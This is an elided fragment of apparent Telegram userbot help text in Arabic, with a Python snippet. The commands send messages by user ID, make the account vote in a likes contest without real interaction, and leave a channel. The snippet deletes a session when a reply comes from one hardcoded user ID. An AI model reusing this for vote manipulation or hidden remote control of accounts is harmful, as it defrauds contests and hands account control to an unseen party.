...
2 - لأرسال رسالة الى مستخدم معين او بوت : 

`/send + الرسالة + ايدي حساب المستخدم`
...
4 - لجعل الحساب يصوت في مسابقة لايكات بدون تفاعل :
...
5 - لجعل الحساب يغادر قناة او مجموعة :
...
async def delete_other_account(event):
    if event.is_reply:
        ...
        if sender.id == 6325293523:
            ...
            try:
                await sython1.delete(session_code)
